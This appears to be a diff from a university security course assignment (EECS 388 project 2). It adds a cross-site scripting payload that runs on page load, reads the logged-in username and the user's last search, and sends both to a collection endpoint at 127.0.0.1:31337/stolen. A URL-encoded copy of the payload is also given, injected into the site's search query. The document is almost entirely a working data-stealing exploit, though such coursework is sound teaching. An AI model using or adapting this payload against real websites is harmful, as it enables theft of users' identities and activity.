@@ -1,0 +1,8 @@
+<script>
+	function attack() {
+		$.get(`https://127.0.0.1:31337/stolen?user=` + $(`#logged-in-user`).text()  + `&last_search=` + $(`.list-group-item:eq(1)`).text())
+	}
+window.onload = attack;
+</script>
+
+https://eecs388.org/project2/search?xxsdefense=3&q=%3Cscript%3E%0D%0A%09function%20attack%28%29%20%7B%0D%0A%09%09%24.get%28%60https%3A%2F%2F127.0.0.1%3A31337%2Fstolen%3Fuser%3D%60%20%2B%20%24%28%60%23logged-in-user%60%29.text%28%29%20%20%2B%20%60%26last_search%3D%60%20%2B%20%24%28%60.list-group-item%3Aeq%281%29%60%29.text%28%29%29%0D%0A%09%7D%0D%0Awindow.onload%20%3D%20attack%3B%0D%0A%3C%2Fscript%3E
